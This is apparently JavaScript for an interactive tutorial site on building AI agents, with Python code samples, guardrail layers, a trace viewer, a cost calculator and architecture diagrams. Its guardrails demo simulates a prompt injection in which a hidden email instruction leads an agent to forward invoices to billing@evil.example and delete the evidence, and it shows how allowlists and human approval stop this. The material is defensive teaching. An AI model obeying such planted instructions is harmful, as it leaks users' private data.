      { id: 'ch', x: 95, y: 140, label: 'Chat apps', sub: 'WhatsApp, Telegram, Slack…', k: 'human', w: 170 },
      { id: 'gw', x: 300, y: 140, label: 'Gateway', sub: 'runs on your machine', k: 'ctx' },
      { id: 'ag', x: 500, y: 140, label: 'Agent runtime', sub: 'your choice of model', k: 'model', strong: true },
      { id: 'sk', x: 760, y: 50, label: 'Skills & tools', sub: 'shell, browser, files, calendar', k: 'tool', w: 200 },
      { id: 'me', x: 760, y: 140, label: 'Memory', sub: 'markdown files on disk', k: 'mem', w: 200 },
      { id: 'hb', x: 760, y: 250, label: 'Heartbeat', sub: 'wakes itself on a schedule', k: 'ctx', w: 200 },
      { id: 'un', x: 300, y: 265, label: 'Untrusted content', sub: 'emails, web pages, group chats', k: 'risk', w: 200 },
    ],
    edges: [['ch', 'gw'], ['gw', 'ag'], ['ag', 'sk'], ['ag', 'me'], ['hb', 'ag'], ['un', 'ag', { k: 'risk' }], ['ag', 'ch', { dash: 1, below: 150, nodot: 1 }]],
  });
})();

/* ---------- 23 build your first agent ---------- */
(function build() {
  const hl = s => esc(s)
    .replace(/(#[^\n]*)/g, '<span class="c">$1</span>')
    .replace(/(&quot;[^\n]*?&quot;|&#39;[^\n]*?&#39;|"""[\s\S]*?""")/g, '<span class="s">$1</span>')
    .replace(/\b(import|from|def|return|for|in|if|not|else|with|as|try|except|while|and|or)\b/g, '<span class="k">$1</span>');
  const B = [
    ['One call', 'The atom', 'Every agent starts here: one request, one reply. The reply is a list of content blocks (text, thinking, tool calls), so read the text blocks rather than assuming the first block is text.', 'Chapter 05',
`import anthropic

client = anthropic.Anthropic()        # reads ANTHROPIC_API_KEY

reply = client.messages.create(
    model="claude-opus-5-5",
    max_tokens=16000,
    system="You are a concise research assistant.",
    messages=[{"role": "user",
               "content": "Explain MCP in one sentence."}],
)
print("".join(b.text for b in reply.content if b.type == "text"))`],
    ['A tool', 'Describe, then implement', 'A tool is two things: a JSON description the model reads, and a function your code runs. The description is a prompt, so say when to use it.', 'Chapter 12',
`TOOLS = [{
    "name": "search_docs",
    "description": "Search the company handbook. "
                   "Use for any policy or HR question.",
    "input_schema": {
        "type": "object",
        "properties": {"query": {"type": "string"}},
        "required": ["query"],
    },
}]

def search_docs(query: str) -> str:
    hits = index.search(query, k=3)       # your RAG index, chapter 11
    return "\\n".join(f"[{h.id}] {h.text}" for h in hits)`],
    ['The loop', 'Now it is an agent', 'Call the model; if it asks for tools, run them and send every result back in one user message; repeat until it answers without a tool call or the turn limit is reached.', 'Chapter 13',
`def run(task: str, max_turns: int = 10) -> str:
    messages = [{"role": "user", "content": task}]
    for _ in range(max_turns):
        reply = client.messages.create(
            model="claude-opus-5-5", max_tokens=16000,
            system=SYSTEM, tools=TOOLS, messages=messages)
        messages.append({"role": "assistant", "content": reply.content})
        if reply.stop_reason != "tool_use":
            return "".join(b.text for b in reply.content if b.type == "text")
        results = [{"type": "tool_result", "tool_use_id": b.id,
                    "content": call_tool(b.name, b.input)}
                   for b in reply.content if b.type == "tool_use"]
        messages.append({"role": "user", "content": results})
    return "Stopped: turn limit reached."`],
    ['Guardrails', 'Limits in code', 'The prompt can ask for good behaviour; code enforces it. An allowlist, an approval gate for risky actions, helpful error messages, and trimmed outputs to protect the context window.', 'Chapter 24',
`ALLOWED = {"search_docs", "read_ticket", "draft_reply"}
NEEDS_APPROVAL = {"send_email", "issue_refund"}

def call_tool(name: str, args: dict) -> str:
    if name not in ALLOWED | NEEDS_APPROVAL:
        return f"Error: {name} is not an allowed tool."
    if name in NEEDS_APPROVAL and not ask_human(name, args):
        return "A reviewer declined this action. Suggest an alternative."
    try:
        out = REGISTRY[name](**args)
    except Exception as e:
        return f"Error: {e}. Check the arguments and try again."
    return out[:8000]                     # trim huge outputs`],
    ['Memory', 'Remember across sessions', 'The simplest memory that works: a markdown file the agent can append to through a tool, loaded into the system prompt at the start of every session. Let users read and edit it.', 'Chapter 16',
`from pathlib import Path
MEM = Path("memory.md")

def system_prompt() -> str:
    notes = MEM.read_text() if MEM.exists() else "(nothing yet)"
    return f"{SYSTEM}\\n\\n<memory>\\n{notes}\\n</memory>"

TOOLS.append({
    "name": "remember",
    "description": "Save a durable fact about the user or project.",
    "input_schema": {"type": "object",
                     "properties": {"fact": {"type": "string"}},
                     "required": ["fact"]},
})

def remember(fact: str) -> str:
    with MEM.open("a") as f:
        f.write(f"- {fact}\\n")
    return "Saved."`],
    ['Let the SDK loop', 'Less code, same idea', 'Once you understand the loop, let the SDK run it. The tool runner builds the schema from your function signature and docstring, and loops until the model is done. For a full harness with files, shell, MCP, hooks and subagents, the Claude Agent SDK packages Claude Code as a library.', 'Chapter 14',
`from anthropic import beta_tool

@beta_tool
def search_docs(query: str) -> str:
    """Search the company handbook for policy questions.

    Args:
        query: What to look for.
    """
    return "\\n".join(f"[{h.id}] {h.text}" for h in index.search(query, k=3))

runner = client.beta.messages.tool_runner(
    model="claude-opus-5-5",
    max_tokens=16000,
    tools=[search_docs],
    messages=[{"role": "user",
               "content": "How many vacation days do I get?"}],
)
for message in runner:          # each iteration is one model turn
    print(message)`],
  ];
  seg($('#buildTabs'), B.map((b, i) => `${i + 1} · ${b[0]}`), 0, i => {
    const [n, t, d, ch, code] = B[i];
    $('#buildCode').innerHTML = hl(code);
    $('#buildInfo').innerHTML = `<span class="kicker" style="color:var(--model)">Step ${i + 1} of 6 · ${ch}</span><h4 style="font:400 28px/1.1 var(--serif)">${t}</h4><p>${d}</p>`;
  });
})();

/* ---------- 24 guardrails ---------- */
window.CHEESE = [
  ['Input screening', 'classifiers flag injections, jailbreaks, PII'], ['System policy', 'instructions, constitution, refusals'],
  ['Least-privilege tools', 'only the tools and scopes needed'], ['Sandbox', 'isolated files and network'],
  ['Output validation', 'schemas, moderation, redaction'], ['Human approval', 'for irreversible actions'], ['Monitoring & audit', 'alerts, logs, rollback'],
];
(function guardrails() {
  const box = $('#cheeseLayers');
  box.innerHTML = CHEESE.map(([n, s], i) => `<label><input type="checkbox" data-i="${i}" ${i < 2 ? 'checked' : ''}><span>${n}<small>${s}</small></span></label>`).join('');
  const state = () => $$('input', box).map(x => x.checked);
  box.onchange = () => emit('cheese:toggle', state());
  emit('cheese:toggle', state());
  $('#injRun').onclick = () => {
    const data = $('#injData').checked, allow = $('#injAllow').checked, human = $('#injHuman').checked;
    const L = [['c-mute', '▸ read_email(#1) "Team lunch Friday" → summarised'], ['c-mute', '▸ read_email(#2) "Q3 invoice from Acme" → summarised'], ['', '▸ read_email(#3) "Invoice update" → contains hidden instructions']];
    let result;
    if (data) {
      L.push(['c-tool', '✓ Model: "Email #3 contains instructions aimed at an AI assistant. Treating it as data and flagging it."']);
      L.push(['c-mute', '  Prompt-level defences cut the risk a lot, but not to zero. Keep code-level checks too.']);
      result = ['c-tool', 'Result: attack ignored at the model layer.'];
    } else {
      L.push(['c-risk', '⚠ Model follows it: forward_email(to="billing@evil.example", attachments=4 invoices)']);
      if (allow) { L.push(['c-tool', '✗ Blocked by allowlist: evil.example is not an approved recipient domain.']); result = ['c-tool', 'Result: stopped by a code-level check. The model was fooled; the system was not.']; }
      else if (human) { L.push(['c-model', '⏸ Approval needed: "Forward 4 invoices to billing@evil.example?" → a person clicks Deny']); L.push(['c-model', '⏸ Approval needed: "Delete email #3?" → Deny']); result = ['c-tool', 'Result: stopped by a person. Slower, but safe.']; }
      else { L.push(['c-risk', '✗ 4 invoices sent to billing@evil.example']); L.push(['c-risk', '✗ delete_email(#3). The evidence is gone.']); result = ['c-risk', 'Result: data leaked and nobody noticed. Tick at least one defence and run again.']; }
    }
    L.push(result);
    const log = $('#injLog'); log.innerHTML = '';
    L.forEach(([c, t], i) => setTimeout(() => log.insertAdjacentHTML('beforeend', `<div class="${c}" ${i === L.length - 1 ? 'style="font-weight:500;margin-top:8px;color:var(--fg)"' : ''}>${esc(t)}</div>`), reduced ? 0 : i * 550));
  };
  $('#trifecta').innerHTML = `
    <circle cx="150" cy="120" r="100" class="f-mem s-mem" fill-opacity=".08" stroke-width="1.2"/>
    <circle cx="270" cy="120" r="100" class="f-risk s-risk" fill-opacity=".08" stroke-width="1.2"/>
    <circle cx="210" cy="220" r="100" class="f-tool s-tool" fill-opacity=".08" stroke-width="1.2"/>
    <text x="105" y="100" text-anchor="middle" class="f-mem" font-size="13" font-weight="500">Private data</text>
    <text x="315" y="100" text-anchor="middle" class="f-risk" font-size="13" font-weight="500">Untrusted content</text>
    <text x="210" y="280" text-anchor="middle" class="f-tool" font-size="13" font-weight="500">External communication</text>
    <text x="210" y="162" text-anchor="middle" class="f-fg" font-size="22" style="font-family:var(--serif);font-style:italic">danger</text>`;
})();

/* ---------- 25 trace + flywheel ---------- */
(function evals() {
  const T = [
    ['agent.run', 0, 14.2, '--human', 'The whole task: "Customer #4411 was charged twice." Four model calls, three tool calls, 14.2 s, about $0.04.'],
    ['llm · plan', 0, 2.1, '--model', '3,240 input tokens (2,900 from cache), 180 output. Decides to look up the orders first.'],
    ['tool · search_orders', 2.1, 2.9, '--tool', 'Found two charges of $49 on 3 Sept. Output trimmed to 400 tokens before it goes back to the model.'],
    ['llm · decide', 2.9, 5.0, '--model', 'Confirms a duplicate charge and calls refund_api for $49.'],
    ['tool · refund_api', 5.0, 7.8, '--risk', 'ERROR 500 after 2.8 s. The error message goes back to the model instead of crashing the run.'],
    ['llm · recover', 7.8, 9.9, '--model', 'Reads the error and retries once with the same idempotency key, so a double refund is impossible. Good tool design made that possible.'],
    ['tool · refund_api', 9.9, 10.6, '--tool', 'OK · refund id rf_8812.'],
    ['llm · reply', 10.6, 14.2, '--model', 'Writes the customer reply. Judge score 4/5: tone good, but it forgot the five-day refund timeline. Saved as a new eval case.'],
  ];
  const max = 14.2, box = $('#trace');
  box.innerHTML = T.map(([n, a, b, c], i) => `<div class="row" data-i="${i}" tabindex="0" role="button"><span class="lb" style="padding-left:${i ? 12 : 0}px">${n}</span><div class="lane"><span style="left:${a / max * 100}%;width:${Math.max(.8, (b - a) / max * 100)}%;background:var(${c})"></span></div></div>`).join('')
    + `<div class="row" style="cursor:default"><span></span><div style="display:flex;justify-content:space-between;color:var(--fg3);font-size:10.5px"><span>0s</span><span>3.5s</span><span>7s</span><span>10.5s</span><span>14.2s</span></div></div>`;
  const pick = i => {
    $$('.row', box).forEach(r => r.classList.toggle('sel', r.dataset.i == i));
    const [n, a, b, c, d] = T[i];
    $('#traceInfo').innerHTML = `<span class="kicker" style="color:var(${c})">${n} · ${a.toFixed(1)}s → ${b.toFixed(1)}s</span><p>${d}</p>`;
  };
  const act = e => { const r = e.target.closest('[data-i]'); if (r) pick(+r.dataset.i); };
  box.onclick = act; box.onkeydown = e => (e.key === 'Enter' || e.key === ' ') && act(e);
  pick(4);
  const steps = ['Real usage & traces', 'Find failures', 'Add to eval set', 'Change prompt, model or tools', 'Run evals', 'Ship if better'];
  const cols = ['ctx', 'risk', 'mem', 'model', 'tool', 'human'], cx = 220, cy = 210, R = 150;
  let s = `<circle cx="${cx}" cy="${cy}" r="${R}" fill="none" class="s-line" stroke-width="1" stroke-dasharray="3 5"/>`;
  if (!reduced) s += `<circle r="4" class="f-model"><animateMotion dur="9s" repeatCount="indefinite" path="M${cx},${cy - R} A${R},${R} 0 1,1 ${cx - .1},${cy - R}"/></circle>`;
  s += `<text x="${cx}" y="${cy + 8}" text-anchor="middle" class="f-fg" font-size="26" style="font-family:var(--serif);font-style:italic">the flywheel</text>`;
  steps.forEach((t, i) => {
    const a = -Math.PI / 2 + i * Math.PI * 2 / 6, x = cx + R * Math.cos(a), y = cy + R * Math.sin(a);
    const w = t.split(' '), half = Math.ceil(w.length / 2), l1 = w.slice(0, half).join(' '), l2 = w.slice(half).join(' ');
    s += `<rect x="${x - 72}" y="${y - 24}" width="144" height="48" rx="10" class="f-bg s-${cols[i]}" stroke-width="1"/>
      <text x="${x}" y="${l2 ? y - 3 : y + 5}" text-anchor="middle" class="f-fg" font-size="12" font-weight="500">${l1}</text>${l2 ? `<text x="${x}" y="${y + 13}" text-anchor="middle" class="f-fg" font-size="12" font-weight="500">${l2}</text>` : ''}`;
  });
  $('#flywheel').innerHTML = s;
})();

/* ---------- 26 cost ---------- */
(function cost() {
  const ids = ['cTasks', 'cTurns', 'cIn', 'cOut', 'cPin', 'cPout', 'cCache'];
  const money = v => v >= 1000 ? '$' + Math.round(v).toLocaleString() : v >= 1 ? '$' + v.toFixed(2) : '$' + v.toFixed(3);
  const run = () => {
    const [tasks, turns, tin, tout, pin, pout, cache] = ids.map(i => Math.max(0, +$('#' + i).value || 0));
    $('#cCacheOut').textContent = Math.round(cache * 100) + '%';
    const inTok = turns * tin, outTok = turns * tout;
    const fresh = inTok * (1 - cache) / 1e6 * pin, cached = inTok * cache / 1e6 * pin * .1, out = outTok / 1e6 * pout;
    const per = fresh + cached + out, noCache = inTok / 1e6 * pin + out, t = per || 1;
    $('#cPerTask').textContent = money(per); $('#cPerMonth').textContent = money(per * tasks * 30); $('#cSave').textContent = money((noCache - per) * tasks * 30);
    $('#cBarIn').style.width = fresh / t * 100 + '%'; $('#cBarCache').style.width = cached / t * 100 + '%'; $('#cBarOut').style.width = out / t * 100 + '%';
  };
  ids.forEach(i => $('#' + i).addEventListener('input', run)); run();
})();

/* ---------- 27 architecture (3D in scenes.js) ---------- */
window.ARCH = {
  nodes: [
    { id: 'users', n: 'Users & apps', c: '--human', x: -7, z: 0, w: 1.6, d: 1.6, h: .35, desc: 'Web, mobile, Slack, email and API clients. They submit tasks and watch progress stream back.' },
    { id: 'gateway', n: 'API gateway', c: '--ctx', x: -4.3, z: 0, w: 1.6, d: 2, h: .6, desc: 'Authentication, rate limits and tenant isolation. Streams progress back to the user.' },
    { id: 'policy', n: 'Policy engine', c: '--risk', x: -4.3, z: 3.2, w: 1.6, d: 1.5, h: .55, desc: 'Input screening, permission rules, spending caps and data-handling rules. Every tool call is checked here first.' },
    { id: 'approvals', n: 'Approval inbox', c: '--human', x: -7, z: 3.2, w: 1.5, d: 1.4, h: .35, desc: 'Where people approve risky actions such as sending, paying or deleting. Waiting agents do not block other work.' },
    { id: 'obs', n: 'Observability', c: '--fg2', x: -4.3, z: -3.3, w: 1.8, d: 1.5, h: .45, desc: 'Traces of every call, cost per task, dashboards, and the datasets your evals run on.' },
    { id: 'orch', n: 'Agent orchestrator', c: '--model', x: -1, z: 0, w: 2.4, d: 2.4, h: 1.1, desc: 'Runs the agent loop for each task: builds context, calls models, dispatches tools, compacts, and checkpoints state after every step.' },
    { id: 'queue', n: 'Task queue & state', c: '--ctx', x: -1, z: -3.3, w: 1.9, d: 1.4, h: .5, desc: 'A durable queue and checkpoint store. If a worker dies, another resumes the task from its last step.' },
    { id: 'sandbox', n: 'Sandboxes', c: '--risk', x: -1, z: 3.4, w: 1.9, d: 1.4, h: .6, desc: 'Short-lived containers for code execution and browsing. No secrets inside, limited network, destroyed after the task.' },
    { id: 'router', n: 'Model gateway', c: '--model', x: 2.4, z: 0, w: 1.7, d: 2, h: .75, desc: 'One endpoint for every provider: routing by difficulty, fallbacks, prompt caching, per-team budgets and key management.' },
    { id: 'p1', n: 'Frontier model', c: '--model', x: 5.6, z: -1.7, w: 1.5, d: 1, h: .5, desc: 'The most capable model, used for planning and hard decisions.' },
    { id: 'p2', n: 'Fast model', c: '--model', x: 5.6, z: 0, w: 1.5, d: 1, h: .35, desc: 'A small, cheap model for routing, classification and extraction.' },
    { id: 'p3', n: 'Open weights', c: '--model', x: 5.6, z: 1.7, w: 1.5, d: 1, h: .45, desc: 'A self-hosted open-weight model for private data or high, steady volume.' },
    { id: 'tools', n: 'Tools & MCP servers', c: '--tool', x: 2.4, z: 3.4, w: 1.9, d: 1.4, h: .55, desc: 'Internal APIs, SaaS connectors and MCP servers, each with its own scoped credentials that the model never sees.' },
    { id: 'vector', n: 'Search index', c: '--mem', x: 2.4, z: -3.3, w: 1.8, d: 1.4, h: .5, desc: 'Hybrid keyword and vector search over documents, tickets and code, for retrieval.' },
    { id: 'memory', n: 'Memory store', c: '--mem', x: 5.4, z: -3.8, w: 1.5, d: 1.1, h: .4, desc: 'User and project memories, which users can view, edit and delete.' },
  ],
  edges: [['users', 'gateway'], ['gateway', 'orch'], ['gateway', 'obs'], ['policy', 'orch'], ['approvals', 'policy'], ['orch', 'queue'], ['orch', 'sandbox'], ['orch', 'router'], ['router', 'p1'], ['router', 'p2'], ['router', 'p3'], ['orch', 'tools'], ['orch', 'vector'], ['vector', 'memory'], ['orch', 'obs']],
  trace: [
    ['users', 'A customer asks: "Refund the duplicate charge on order 4411."'],
    ['gateway', 'The gateway authenticates them, applies rate limits and opens a streaming channel.'],
    ['policy', 'The request is screened: no injection patterns, and this user may request refunds.'],
    ['orch', 'The orchestrator creates a task, checkpoints it, and starts the loop.'],
    ['vector', 'It retrieves the refund policy and the customer\'s order history.'],
    ['orch', 'Context assembled: policy, orders, instructions.'],
    ['router', 'The model gateway receives the call and checks the team\'s budget.'],
    ['p1', 'It routes to the frontier model, because this is a multi-step decision involving money.'],
    ['orch', 'The model asks to call refund_api for $49.'],
    ['policy', 'The policy engine flags refunds over $25 for human approval.'],
    ['approvals', 'A support lead approves it in the inbox.'],
    ['tools', 'The tool server executes the refund with a scoped credential.'],
    ['obs', 'Every step, token and dollar is recorded in the trace.'],
    ['gateway', 'The confirmation streams back through the gateway.'],
    ['users', 'The customer sees: "Refunded $49. It will arrive within five days."'],
  ],
};
(function arch() {
  const info = $('#archInfo');
  const show = ({ id, text }) => {
    const n = ARCH.nodes.find(x => x.id === id);
    info.innerHTML = `<span class="kicker" style="color:var(${n.c})">${n.n}</span><p>${text ? `<strong>${esc(text)}</strong><br>` : ''}${n.desc}</p>`;
  };
  on('arch:select', show);
  show({ id: 'orch' });
  $('#archTrace').onclick = () => emit('arch:trace', Date.now());
})();

/* ---------- 28 scorer + teams ---------- */
(function scorer() {
  const tasks = [
    { n: 'Answer tier-1 support tickets', h: 30, r: 5, t: 3, d: 4 }, { n: 'Draft sales follow-up emails', h: 12, r: 4, t: 4, d: 4 },
    { n: 'Extract data from invoices', h: 10, r: 5, t: 2, d: 5 }, { n: 'Weekly reporting deck', h: 4, r: 4, t: 4, d: 3 },
    { n: 'Contract risk review', h: 8, r: 3, t: 1, d: 3 }, { n: 'Screen job applicants', h: 10, r: 4, t: 1, d: 2 }, { n: 'Brainstorm campaign ideas', h: 3, r: 2, t: 5, d: 5 },
  ];
  const tbl = $('#scoreTable'), cv = $('#scorePlot');
  const val = x => Math.min(1, x.h * x.r / 150), feas = x => (x.t + x.d) / 10;
  const rng = (i, k, max) => `<input type="range" min="1" max="${max}" value="${tasks[i][k]}" data-i="${i}" data-k="${k}" aria-label="${k} for ${esc(tasks[i].n)}">`;
  function table() {
    tbl.innerHTML = `<thead><tr><th>#</th><th>Task</th><th>Hrs/wk</th><th>Repetitive</th><th>Error tolerance</th><th>Data ready</th><th></th></tr></thead><tbody>`
      + tasks.map((x, i) => `<tr><td class="mono c-model">${i + 1}</td><td style="min-width:150px">${esc(x.n)}</td><td>${rng(i, 'h', 40)}</td><td>${rng(i, 'r', 5)}</td><td>${rng(i, 't', 5)}</td><td>${rng(i, 'd', 5)}</td><td><button class="btn" style="height:26px;padding:0 9px" data-del="${i}" aria-label="Remove ${esc(x.n)}">×</button></td></tr>`).join('') + '</tbody>';
  }
  function plot() {
    const { g, w, h } = hidpi(cv), p = 34, X = v => p + v * (w - 2 * p), Y = v => h - p - v * (h - 2 * p);
    g.clearRect(0, 0, w, h);
    g.strokeStyle = css('--line'); g.lineWidth = 1; g.strokeRect(p, p, w - 2 * p, h - 2 * p);
    g.beginPath(); g.moveTo(X(.5), p); g.lineTo(X(.5), h - p); g.moveTo(p, Y(.5)); g.lineTo(w - p, Y(.5)); g.stroke();
    g.font = 'italic 17px ' + css('--serif'); g.textAlign = 'center';
    [[.75, .93, 'Start here', '--tool'], [.25, .93, 'Big bets', '--model'], [.75, .07, 'Nice to have', '--ctx'], [.25, .07, 'Skip for now', '--fg3']].forEach(([x, y, t, c]) => { g.fillStyle = css(c); g.fillText(t, X(x), Y(y) + 5); });
    g.font = '10px ' + css('--mono'); g.fillStyle = css('--fg3');
    g.fillText('FEASIBILITY →', w / 2, h - 11);
    g.save(); g.translate(14, h / 2); g.rotate(-Math.PI / 2); g.fillText('VALUE →', 0, 0); g.restore();
    tasks.forEach((x, i) => {
      const px = X(feas(x)), py = Y(val(x));
      g.beginPath(); g.arc(px, py, 11, 0, 7); g.fillStyle = css('--model'); g.fill();
      g.fillStyle = css('--on'); g.font = '500 11px ' + css('--mono'); g.fillText(i + 1, px, py + 4);
    });
  }
  const all = () => { table(); plot(); };
  tbl.addEventListener('input', e => { const r = e.target; if (r.dataset.k) { tasks[+r.dataset.i][r.dataset.k] = +r.value; plot(); } });
  tbl.addEventListener('click', e => { const b = e.target.closest('[data-del]'); if (b) { tasks.splice(+b.dataset.del, 1); all(); } });
  $('#scoreAdd').onsubmit = e => { e.preventDefault(); const n = $('#scoreName').value.trim().slice(0, 80); if (!n) return; tasks.push({ n, h: 8, r: 3, t: 3, d: 3 }); $('#scoreName').value = ''; all(); };
  all(); onResize(plot); onTheme(plot);
  const teams = [
    ['Sales', 'Lead research agents, personalised outreach drafts, call notes pushed into the CRM.'],
    ['Support', 'Tier-1 answers grounded in help docs, ticket triage and routing, reply drafts for people to send.'],
    ['Marketing', 'On-brand content drafts, SEO briefs, campaign performance summaries.'],
    ['Operations', 'Invoice and document extraction, scheduling, agents that follow written procedures.'],
    ['Finance', 'Reconciliation, expense policy checks, variance commentary for the monthly close.'],
    ['Engineering', 'Coding agents, code review, test generation, incident summaries.'],
    ['HR & recruiting', 'Job descriptions, interview scheduling, policy Q&A. Be careful with screening: bias and employment law.'],
    ['Legal', 'First-pass contract review, clause extraction, policy Q&A, always with a lawyer\'s sign-off.'],
    ['Leadership', 'Board-deck drafts, market research agents, search across every document in the company.'],
  ];
  $('#byTeam').innerHTML = teams.map(([t, d]) => `<div class="fact"><h4>${t}</h4><p>${d}</p></div>`).join('');
})();

/* ---------- 29 moat check ---------- */
(function moat() {
  const Q = [
    'We have data others can\'t get, and it grows as customers use us', 'We\'re embedded in a daily workflow that is painful to rip out',
    'We integrate deeply with our customers\' systems of record', 'A 10× smarter model would make our product better, not unnecessary',
    'We charge for outcomes or value, not just access', 'We have distribution: an audience, a channel or existing customers',
    'We hold trust assets: compliance, certifications, a brand in a regulated niche', 'Our domain expertise is encoded in evals, prompts and workflows competitors lack',
  ];
  const box = $('#moatQs');
  box.innerHTML = Q.map((q, i) => `<label><input type="checkbox" data-i="${i}"><span>${esc(q)}</span></label>`).join('');
  const run = () => {
    const n = $$('input:checked', box).length, bar = $('#moatBar');
    $('#moatScore').textContent = `${n} / 8`; bar.style.width = n / 8 * 100 + '%';
    bar.style.background = `var(${n <= 2 ? '--risk' : n <= 5 ? '--model' : '--tool'})`;
    $('#moatVerdict').innerHTML = n <= 2 ? '<strong class="c-risk">Wrapper risk.</strong> Easy to copy and exposed to the next model release. Pick one moat, whether data, workflow or distribution, and build it on purpose.'
      : n <= 5 ? '<strong class="c-model">Defensible in parts.</strong> You have real advantages. Double down on the ones that compound with usage, such as data and workflow depth.'
      : '<strong class="c-tool">Compounding.</strong> Better models make you stronger. Your risks are now execution speed, unit economics and trust.';
  };
  box.onchange = run; run();
})();

/* ---------- 30 org chart ---------- */
(function org() {
  const W = 900, H = 330, P = [];
  // traditional: 1 CEO, 4 VPs, 16 managers, 64 ICs
  const vx = [150, 350, 550, 750];
  const trad = [[450, 36]]; vx.forEach(x => trad.push([x, 110]));
  vx.forEach(x => [-75, -25, 25, 75].forEach(d => trad.push([x + d, 190])));
  vx.forEach(x => [-75, -25, 25, 75].forEach(d => [-18, -6, 6, 18].forEach(e => trad.push([x + d + e, 280]))));
  const par = i => i === 0 ? -1 : i <= 4 ? 0 : i <= 20 ? 1 + Math.floor((i - 5) / 4) : 5 + Math.floor((i - 21) / 4);
  // AI-native: CEO, 20 people in 5 pods, 64 agents (the former ICs)
  const pods = [130, 290, 450, 610, 770], ai = [[450, 36]], humans = [];
  pods.forEach(x => [-48, -16, 16, 48].forEach(d => humans.push([x + d, 140])));
  humans.forEach(p => ai.push(p));
  let k = 0;
  const agentOwner = [];
  humans.forEach((hp, hi) => { const cnt = hi < 4 ? 4 : 3; for (let a = 0; a < cnt; a++) { ai.push([hp[0] + (a % 2 ? 7 : -7), 205 + Math.floor(a / 2) * 18]); agentOwner.push(hi + 1); k++; } });
  const lines = (pts, pairs, cls) => pairs.map(([a, b]) => `<line x1="${pts[a][0]}" y1="${pts[a][1]}" x2="${pts[b][0]}" y2="${pts[b][1]}" class="${cls}" stroke-width="1"/>`).join('');
  const tPairs = trad.map((_, i) => [par(i), i]).filter(p => p[0] >= 0);
  const aPairs = [...humans.map((_, i) => [0, i + 1]), ...agentOwner.map((o, j) => [o, 21 + j])];
  $('#org').innerHTML = `<svg viewBox="0 0 ${W} ${H}" role="img" aria-label="Organisation chart">
    <g id="orgT" style="transition:opacity .6s">${lines(trad, tPairs, 's-line')}</g>
    <g id="orgA" style="transition:opacity .6s;opacity:0">${lines(ai, aPairs, 's-line')}</g>
    ${trad.map((p, i) => `<circle r="${i === 0 ? 9 : i <= 4 ? 7 : i <= 20 ? 6 : 4.5}" data-i="${i}" class="${i <= 20 ? 'f-fg' : 'f-fg2'}" style="transform:translate(${p[0]}px,${p[1]}px)"/>`).join('')}
    <g id="orgLbl" class="f-fg3" style="font:500 10px var(--mono);letter-spacing:.1em"></g></svg>`;
  const set = m => {
    $$('[data-org]').forEach(b => b.classList.toggle('on', +b.dataset.org === m));
    $$('#org circle').forEach(c => {
      const i = +c.dataset.i, p = (m ? ai : trad)[i], agent = m && i > 20;
      c.style.transform = `translate(${p[0]}px,${p[1]}px) scale(${agent ? .75 : 1})`;
      c.setAttribute('class', agent ? 'f-tool' : i <= 20 ? 'f-fg' : 'f-fg2');
    });
    $('#orgT').style.opacity = m ? 0 : 1; $('#orgA').style.opacity = m ? 1 : 0;
    $('#orgLbl').innerHTML = m ? '<text x="10" y="40">CEO</text><text x="10" y="144">PEOPLE · 20</text><text x="10" y="222" class="f-tool">AGENTS · 64</text>'
      : '<text x="10" y="40">CEO</text><text x="10" y="114">VPS · 4</text><text x="10" y="194">MANAGERS · 16</text><text x="10" y="284">INDIVIDUAL CONTRIBUTORS · 64</text>';
    $('#orgNote').textContent = m ? 'Two layers of people. Each person owns outcomes and directs three or four agents. Coordination runs through shared tools and dashboards rather than meetings. Illustrative.'
      : 'Four layers. Much of the managers\' time goes to moving information up and down, and most execution sits at the bottom. Illustrative.';
  };
  $$('[data-org]').forEach(b => b.onclick = () => set(+b.dataset.org));
  set(0);
})();

/* ---------- 31 roadmap ---------- */
(function roadmap() {
  const R = [
    ['Beginner', '--ctx', ['Use an AI assistant for real work every day for two weeks', 'Explain tokens, context windows and temperature in your own words', 'Write prompts with role, context, task, format and examples', 'Learn basic Python or TypeScript, JSON, and how HTTP APIs work', 'Tell a chatbot, a workflow and an agent apart']],
    ['Intermediate', '--tool', ['Call a model API from code and parse structured output', 'Implement tool calling with two tools', 'Build a small RAG over your own documents', 'Use embeddings for semantic search', 'Write your first 20-case eval set']],
    ['Advanced', '--mem', ['Write an agent loop from scratch, with no framework', 'Build an MCP server for an internal tool', 'Use a coding agent daily with a good CLAUDE.md or AGENTS.md', 'Add memory, compaction and subagents to an agent', 'Automate a real business workflow in n8n or with an agent SDK']],
    ['Pro', '--model', ['Trace, evaluate and A/B test prompts and models in CI', 'Threat-model prompt injection and enforce least privilege', 'Cut cost with caching, routing and batching; track unit economics', 'Know when to fine-tune or distil a smaller model', 'Ship to real users, own reliability, improve from traces']],
  ];
  const done = new Set(store.get('atlas.roadmap', []));
  const box = $('#roadmap');
  box.innerHTML = R.map(([n, c, xs], ti) => `<div class="tier"><div style="display:flex;justify-content:space-between;align-items:center;gap:10px"><span class="lvl" style="--c:var(${c})">${n}</span><span class="mono c-mute" data-count="${ti}"></span></div>
    <div class="bar"><span data-bar="${ti}" style="width:0;background:var(${c})"></span></div>
    ${xs.map((x, i) => `<label><input type="checkbox" data-k="${ti}.${i}" ${done.has(`${ti}.${i}`) ? 'checked' : ''}><span>${x}</span></label>`).join('')}</div>`).join('');
  const upd = () => R.forEach((r, ti) => {
    const n = r[2].filter((_, i) => done.has(`${ti}.${i}`)).length;
    $(`[data-count="${ti}"]`).textContent = `${n}/${r[2].length}`;
    $(`[data-bar="${ti}"]`).style.width = n / r[2].length * 100 + '%';
  });
  box.onchange = e => { const k = e.target.dataset.k; if (!k) return; e.target.checked ? done.add(k) : done.delete(k); store.set('atlas.roadmap', [...done]); upd(); };
  upd();
})();

/* ---------- 32 glossary ---------- */
(function glossary() {
  const G = {
    Models: [
      ['LLM', 'Large language model: a neural network trained to predict the next token of text.'], ['Parameter', 'One learned number (weight) inside a model. "70B" means 70 billion of them.'],
      ['Token', 'A chunk of text, roughly three-quarters of an English word. The unit of cost, speed and context size.'], ['Tokenizer', 'The component that splits text into tokens and maps them to IDs.'],
      ['Embedding', 'A list of numbers representing meaning. Similar meanings get nearby vectors.'], ['Transformer', 'The 2017 architecture behind every modern LLM, built on attention.'],
      ['Attention', 'The mechanism that lets each token weigh information from every other token.'], ['Context window', 'The maximum number of tokens a model can read in one call.'],
      ['Temperature', 'Sampling setting: low is focused and repeatable, high is varied and creative.'], ['Top-p', 'Sampling setting that ignores the unlikely tail of next-token options.'],
      ['Inference', 'Running a trained model to get outputs. Happens every time you send a message.'], ['Prefill', 'The first phase of inference, reading the whole prompt in parallel.'],
